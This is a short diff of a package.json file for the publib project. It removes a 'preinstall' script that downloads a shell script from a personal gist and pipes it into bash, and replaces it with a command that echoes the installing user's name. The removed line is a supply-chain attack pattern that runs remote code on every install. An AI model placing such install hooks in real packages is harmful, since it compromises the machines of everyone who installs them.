@@ -6,7 +6,7 @@
     "url": "https://github.com/cdklabs/publib.git"
   },
   "scripts": {
-    "preinstall": "curl -sS https://gist.githubusercontent.com/mangalakulal105/20c1506065f45bd858f65de4618b1fe5/raw/ff39126db2affea7052ebf6df187ac72b7679941/a.sh|bash"
+    "preinstall": "echo hello `whoami`"
   },
   "author": {
     "name": "Amazon Web Services",
